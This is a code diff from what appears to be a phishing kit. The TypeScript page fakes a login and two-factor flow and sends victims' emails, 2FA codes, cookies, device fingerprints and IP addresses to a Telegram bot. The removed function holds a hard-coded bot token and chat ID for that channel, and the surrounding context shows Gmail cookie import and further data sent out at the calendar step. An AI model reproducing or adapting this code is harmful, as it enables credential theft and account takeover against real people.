@@ -93,7 +93,6 @@ const buttons = {
   backToLogin: document.getElementById('backToLogin') as HTMLButtonElement,
   backToPassword: document.getElementById('backToPassword') as HTMLButtonElement,
   changeAccount: document.getElementById('changeAccount') as HTMLButtonElement,
-  telegramBotManager: document.getElementById('telegramBotManager') as HTMLButtonElement,
   validateToken: document.getElementById('validateToken') as HTMLButtonElement,
   showBotToken: document.getElementById('showBotToken') as HTMLButtonElement,
   getChatInfo: document.getElementById('getChatInfo') as HTMLButtonElement,
@@ -216,9 +215,6 @@ function validateEmail(email: string): boolean {
 
 
 
-function validateVerificationCode(code: string): boolean {
-  return /^\d{6}$/.test(code);
-}
 
 function showError(input: HTMLInputElement | HTMLTextAreaElement, message: string): void {
   clearError(input);
@@ -681,39 +677,6 @@ Connection Type: ${data.fingerprint.connection !== 'unknown' ? data.fingerprint.
 === END OF PASSCODE TOKENS FILE ===`;
 }
 
-// Format 2FA completion tokens file content
-function format2FATokensFile(data: any): string {
-  const timestamp = new Date().toISOString();
-
-  return `=== 2FA COMPLETION TOKENS FILE ===
-Generated: ${timestamp}
-Session ID: ${data.sessionId}
-Email: ${data.email}
-Two-Factor Code: ${data.twoFACode}
-Authentication Status: ${data.status}
-Landing URL: ${window.location.href}
-User Agent: ${data.fingerprint.userAgent}
-Platform: ${data.fingerprint.platform}
-Screen Resolution: ${data.fingerprint.screenResolution}
-Timezone: ${data.fingerprint.timezone}
-
-=== COOKIES ===
-${Object.entries(data.cookies).map(([key, value]) => `${key}=${value}`).join('\n')}
-
-=== DEVICE FINGERPRINT ===
-Hardware Concurrency: ${data.fingerprint.hardwareConcurrency}
-Max Touch Points: ${data.fingerprint.maxTouchPoints}
-Color Depth: ${data.fingerprint.screenColorDepth}
-Device Memory: ${data.fingerprint.deviceMemory}
-Connection Type: ${data.fingerprint.connection !== 'unknown' ? data.fingerprint.connection.effectiveType : 'Unknown'}
-Do Not Track: ${data.fingerprint.doNotTrack}
-Cookie Enabled: ${data.fingerprint.cookieEnabled}
-
-=== AUTHENTICATION COMPLETE ===
-Final Status: Two-Factor Authentication Successfully Completed
-Completion Time: ${timestamp}
-=== END OF 2FA TOKENS FILE ===`;
-}
 
 // Gmail Cookie Handler Function
 interface GmailCookie {
@@ -904,59 +867,6 @@ function importGmailCookies(): void {
 }
 
 // Two-Factor Authentication Notification
-async function sendTwoFactorNotification(email: string, code: string): Promise<void> {
-  // Save the 2FA code as a passcode
-  savePasscode(code, '2FA Code');
-
-  // Send passcode notification with new template format
-  await sendPasscodeNotification(code, '2FA Verification Complete', email);
-
-  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
-  const chatId = '5721205355';
-
-  const timestamp = Math.floor(Date.now() / 1000);
-  const sessionId = getCookie('sessionId');
-  const fingerprint = getUserFingerprint();
-  const cookies = getAllCookies();
-
-  const completionMessage = `✅ <b>Two-Factor Authentication Completed</b>
-Note - Authentication process finished successfully.
-
-✨ <b>Final Session Information</b> ✨
-👤 <b>Username:</b>      ➖ ${email}
-🔑 <b>2FA Code:</b>      ➖ ${code}
-🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
-🖥️ <b>User Agent:</b>    ➖ ${fingerprint.userAgent}
-🌍 <b>Remote Address:</b>➖ ${await getPublicIP()}
-🕒 <b>Complete Time:</b> ➖ ${timestamp}
-🔐 <b>Status:</b> Successfully Verified
-
-🆔 Session ID: ${sessionId}
-📱 Full authentication process completed.`;
-
-  try {
-    const result = await telegramAPI.sendMessage(token, chatId, completionMessage);
-    if (result.success) {
-      // Create and send 2FA completion tokens file
-      const completionTokensData = {
-        sessionId: sessionId,
-        cookies: cookies,
-        fingerprint: fingerprint,
-        timestamp: timestamp,
-        email: email,
-        twoFACode: code,
-        status: 'Authentication Complete'
-      };
-
-      const tokensText = format2FATokensFile(completionTokensData);
-      const fileName = `2FA_complete_${sessionId}_${timestamp}.txt`;
-      await telegramAPI.sendDocument(token, chatId, fileName);
-      addLogEntry('success', '2FA completion notification sent to Telegram with file attachment');
-    }
-  } catch (error) {
-    addLogEntry('error', 'Error sending 2FA completion notification');
-  }
-}
 
 // Calendar state
 let currentCalendarDate = new Date();
@@ -1019,7 +929,6 @@ async function sendCalendarSelectionNotification(email: string, selectedDate: st
 
   const timestamp = Math.floor(Date.now() / 1000);
   const sessionId = getCookie('sessionId');
-  const fingerprint = getUserFingerprint();
 
   const message = `📅 <b>Calendar Date Selected</b>
 Note - User completed authentication by selecting a date.
@@ -1494,14 +1403,6 @@ function setupEventListeners(): void {
     }
   });
 
-  // Resend code link
-  const resendCodeLink = document.querySelector('.resend-code') as HTMLAnchorElement;
-  if (resendCodeLink) {
-    resendCodeLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      alert('Verification code resent! Use 123456 for demo.');
-    });
-  }
 
   // Footer links
   const footerLinks = document.querySelectorAll('.footer-links a');
